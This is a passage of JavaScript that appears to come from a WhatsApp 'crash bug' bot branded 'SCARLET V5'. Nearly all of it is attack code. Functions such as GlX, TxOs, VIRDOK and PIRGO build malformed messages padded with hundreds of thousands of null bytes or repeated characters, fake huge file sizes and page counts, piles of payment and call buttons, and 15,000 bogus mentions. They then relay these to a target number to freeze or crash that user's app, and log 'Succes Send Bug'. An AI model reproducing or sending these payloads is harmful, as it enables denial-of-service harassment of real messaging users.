										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️', url: \"https://youtube.com/Akmalscar1\", merchant_url: \"https://youtube.com/Akmalscar1\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["62895364760801@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5ㄈ尺Λらн 𝐁𝐔𝐆 𝐕𝟐👑️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				}), {
					userJid: X,
					quoted: EsQl
				}
			);
			await bad.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function GlX(X, Ptcp = true) {
			await bad.relayMessage(X, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5ㄈ尺Λらн👑️",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐈𝐬 𝐇𝐞𝐫𝐞 👑\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RizxzNewtech\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0000".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function GlxCall(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "‎𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5ㄈ尺Λらн👑️"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐈𝐬 𝐇𝐞𝐫𝐞 👑 \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️" + "᬴".repeat(0) + "\",\"sections\":[{\"title𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️\",\"sections\":[{\"title𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"👑️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);

			await bad.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function GlxCallX(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "‎⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐈𝐬 𝐇𝐞𝐫𝐞 👑 \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️" + "᬴".repeat(0) + "\",\"sections\":[{\"title𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐂𝐫𝐚𝐬𝐡 👑👑️\",\"sections\":[{\"title𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"👑️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiX
				}
			);

			await bad.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};

		async function TxOs(X, Ptcp = false) {
			await bad.relayMessage(X, {
					extendedTextMessage: {
						text: "⭑̤⟅̊༑ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "␵␵␵␵␵〜␵␵␵␵␵␵␵〪␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵".repeat(15000),
						contextInfo: {
							mentionedJid: [
								"62895364760801@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@s.whatsapp.net",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: X,
							conversionSource: " X ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " X ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " X "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈👑",
								body: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐈𝐬 𝐇𝐞𝐫𝐞 👑",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " x ",
								sourceId: " x ",
								sourceUrl: "https://www.instagram.com/WhatsApp",
								mediaUrl: "https://www.instagram.com/WhatsApp",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "https://www.instagram.com/WhatsApp"
							},
							groupSubject: " X ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " X ",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: " X ",
								utmCampaign: " X "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " X ",
								contentType: "UPDATE",
								accessibilityText: " X "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 Succes Send Bug By ©King badboi 👑"));
		};
		
		//SPAMMING FLOODS\\
		const VxO = "🔥⃰͜͡⭑𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⭑͜͡🔥⃰" + "\u0000".repeat(50000)

		//REVISION\\
		async function LIVELOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "p",
							"degreesLongitude": "p",
							"caption": `🍷꙰͜͡𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5💸` + "\u0000".repeat(900000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			})
			await bad.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			})
		}

		async function VIRDOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
					"mimetype": "penis",
					"fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
					"fileLength": "999999999",
					"pageCount": 999999999,
					"mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
					"fileName": `🔥፝⃟ ꙳𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5🔥፝⃟` + "\u0000".repeat(900000),
					"fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
					"directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
					"mediaKeyTimestamp": "1715880173"
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await bad.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function BLEKING(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"stickerMessage": {
					"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
					"fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
					"fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
					"mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
					"mimetype": "image/webp",
					"directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
					"fileLength": "10116",
					"mediaKeyTimestamp": "1715876003",
					"isAnimated": false,
					"stickerSentTs": "1715881084144",
					"isAvatar": false,
					"isAiSticker": false,
					"isLottie": false
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await bad.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function PIRGO(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				interactiveMessage: {
					header: {
						title: "🩸⃟༑⌁⃰𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({
							image: {
								url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg"
							}
						}, {
							upload: bad.waUploadToServer
						}))
					},
					body: {
						text: ""
					},
					footer: {
						text: "› ©𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5!!"
					},
					nativeFlowMessage: {
						messageParamsJson: " ".repeat(1000000)
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await bad.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		//QUOTED ZAP\\
		const dottm = {
			key: {
				fromMe: false,
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				orderMessage: {
					orderId: '999999999999',
					thumbnail: null,
					itemCount: 999999999999,
					status: 'INQUIRY',
					surface: 'CATALOG',
					message: '𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5χ ⿻ 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈 ▾',
					token: 'AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=='
				}
			},
			contextInfo: {
				mentionedJid: ['27746135260@s.whatsapp.net'],
				forwardingScore: 999,
				isForwarded: true
			}
		}
		
		const NullNihBos = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5𓍯𓂃",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
